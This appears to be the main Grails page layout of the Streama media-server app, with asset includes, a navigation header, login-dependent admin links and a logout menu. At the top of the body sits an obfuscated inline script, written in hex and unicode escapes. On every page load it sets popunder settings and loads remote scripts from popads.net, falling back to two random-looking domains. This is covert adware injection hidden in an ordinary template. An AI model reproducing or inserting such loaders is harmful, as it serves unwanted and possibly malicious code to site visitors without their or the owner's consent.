<!DOCTYPE html>
<html ng-app="streamaApp" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title><g:layoutTitle default="Grails"/></title>
	<base href="<g:createLink uri="/" />">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="${assetPath(src: 'favicon.ico')}" type="image/x-icon">
	<link rel="apple-touch-icon" href="${assetPath(src: 'apple-touch-icon.png')}">
	<link rel="apple-touch-icon" sizes="114x114" href="${assetPath(src: 'apple-touch-icon-retina.png')}">

	<asset:stylesheet src="vendor.css"/>
	<asset:stylesheet src="application.css"/>

	<asset:javascript src="vendor.js"/>
	<asset:javascript src="application.js"/>

	<g:layoutHead/>
</head>
<body>
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
 (function(){ var n=window;n["_p\x6f\u0070"]=[["si\u0074\u0065Id",1823898],["min\x42i\u0064",0],["\x70\u006f\u0070\u0075n\x64e\x72\u0073\x50\x65r\u0049P",0],["d\u0065\u006c\u0061\u0079\x42\u0065t\u0077\u0065e\x6e",0],["\u0064\u0065\u0066\x61\x75\x6c\u0074",false],["d\u0065\u0066a\u0075\x6c\u0074\x50\u0065\u0072D\u0061y",0],["\x74op\x6d\x6fs\x74\x4c\u0061\u0079\u0065\x72",!0]];var w=["\x2f/c\u0031\x2ep\u006f\x70ad\u0073\x2en\u0065\u0074/\u0070\x6fp\u002e\x6as","/\u002f\u0063\u0032\u002ep\u006f\x70\x61\x64s\x2e\x6ee\x74/\u0070\x6f\u0070\u002ejs","\x2f\x2f\u0077\u0077\x77\x2e\u0062\u0064\u006f\x7ako\u0063g\x6bl\u006aj\x2e\u0063\u006f\x6d/a.\u006as","\u002f\x2f\x77ww\u002e\u0076ag\u0068\x77\u0070b\x73l\u0076\u0062\u0075\u002e\u0063\x6f\u006d\x2f\x6b\x2e\u006as",""],v=0,o,k=function(){if(""==w[v])return;o=n["\x64\x6f\x63\u0075\x6den\x74"]["\u0063r\u0065\x61\u0074e\u0045\u006ce\x6den\x74"]("s\x63\u0072\x69pt");o["\u0074\u0079\x70e"]="te\x78\u0074\u002f\u006a\x61\x76a\u0073\u0063\u0072i\u0070\u0074";o["\x61\x73\x79\u006e\u0063"]=!0;var i=n["\x64oc\u0075\x6de\x6e\u0074"]["\u0067\x65t\u0045\x6c\u0065\x6d\u0065\u006e\x74\u0073\x42y\u0054\u0061gN\x61\u006de"]("\u0073\u0063\u0072i\x70\u0074")[0];o["\x73\x72c"]=w[v];if(v<2){o["\u0063r\u006f\x73\x73O\x72\u0069g\u0069\u006e"]="\x61\u006eo\u006e\x79\u006do\x75\u0073";};o["\x6fn\x65rr\u006f\x72"]=function(){v++;k()};i["\u0070\u0061re\x6e\u0074\x4eo\u0064e"]["\u0069ns\u0065r\u0074B\u0065\u0066\x6f\u0072\x65"](o,i)};k()})();
/*]]>/* */
</script>

<header class="main" ng-if="!isCurrentState('player')">
		<div class="logo_ma">
			<a class="logo" ui-sref="dash">
				<asset:image src="logo.png"></asset:image>
				<!--<div class="version">v0.1</div>-->
				<div class="spinner" ng-show="baseData.loading">
					<div class="bounce1"></div>
					<div class="bounce2"></div>
					<div class="bounce3"></div>
				</div>
			</a>
		</div>
	<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
	<div class="pull-left flex">

		<div class="browse-genres" ng-if="isCurrentState('dash') && genres.length">
			<!--<button class="btn btn-link toggle-menu" ng-click="toggleGenreMenu()">
				<span ng-if="selectedGenre" ng-bind="selectedGenre.name"></span>
				<span ng-if="!selectedGenre">{{'DASHBOARD.BROWSE_GENRES' | translate}}</span>
				<i class="ion-android-arrow-dropdown"></i>
			</button>-->


			<div class="toggle-menu-content" ng-show="genreMenuOpen">
				<i class="ion-close-circled pull-right" ng-click="toggleGenreMenu()"></i>
				<ul>
					<li>
						<a ng-click="changeGenre()"><i class="ion-grid"></i> All</a>
					</li>
					<li ng-repeat="genre in ::genres">
						<a ng-click="changeGenre(genre)" ng-bind="::genre.name"></a>
					</li>
				</ul>
			</div>
		</div>
	</div>


		<ul class="nav navbar-nav">

			<!--<li ng-if="isCurrentState('dash')">
				<div class="dash-search form-group has-feedback">
					<input type="text" placeholder="Search.." class="form-control input-xs" ng-model="dashSearch"
								 typeahead-append-to-body="true" uib-typeahead="(item.title || item.name) for item in searchMedia($viewValue)"
								 typeahead-on-select="selectFromSearch($item)" typeahead-template-url="typeahead--media.htm" typeahead-loading="baseData.loading"/>
					<span class="form-control-feedback ion-android-search" aria-hidden="true"></span>
				</div>
			</li>-->
			<sec:ifLoggedIn>
				<li><a ui-sref="dash">{{'DASHBOARD.TITLE' | translate}}</a></li>
			</sec:ifLoggedIn>

			<sec:ifAnyGranted roles="ROLE_CONTENT_MANAGER">
				<li><a ui-sref="admin.shows">{{'MANAGE_CONTENT' | translate}}</a></li>
			</sec:ifAnyGranted>

      <sec:ifLoggedIn>
      	<sec:ifAnyGranted roles="ROLE_ADMIN">
        	<li><a ui-sref="settings.settings">{{'ADMIN' | translate}}</a></li>
        </sec:ifAnyGranted>
      </sec:ifLoggedIn>

      <sec:ifLoggedIn>
        <li>
					<div class="btn-group" uib-dropdown is-open="status.isopen" style="margin: 5px 0;">
						<button id="single-button" style="top:1px;" type="button" class="btn btn-primary btn-sm"
										uib-dropdown-toggle ng-disabled="disabled">
							{{$root.currentUser.fullName || $root.currentUser.username}} <span class="caret"></span>
						</button>
						<ul class="dropdown-menu dropdown-menu-right"
								uib-dropdown-menu role="menu" aria-labelledby="single-button">
							<!--<li role="menuitem"><a ui-sref="help">{{'HELP_FAQ' | translate}}</a></li>-->
							<li role="menuitem"><a ui-sref="profile">{{'PROFILE_SETTINGS' | translate}}</a></li>
							<li class="divider"></li>
							<li><g:link uri="/j_spring_security_logout">{{'LOGOUT' | translate}}</g:link></li>
						</ul>
					</div>
				</li>
      </sec:ifLoggedIn>
		</ul>
	</div>

	<i class="ion-navicon navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1"></i>
</header>

<g:layoutBody/>
</body>
</html>
